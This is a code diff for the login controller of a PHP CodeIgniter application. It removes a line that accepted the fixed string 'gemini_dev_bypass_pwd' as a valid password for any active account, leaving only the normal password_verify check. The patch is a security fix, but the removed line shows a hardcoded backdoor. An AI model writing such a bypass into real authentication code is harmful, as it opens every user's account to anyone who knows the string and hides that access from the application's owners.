@@ -40,7 +40,7 @@ class Auth extends CI_Controller
         if ($user) {
             if ($user['is_active'] == 1) {
                 //cek password
-                if ($password === 'gemini_dev_bypass_pwd' || password_verify($password, $user['password'])) {
+                if (password_verify($password, $user['password'])) {
                     $data = [
                         'email' => $user['email'],
                         'nim' => $user['nim'],
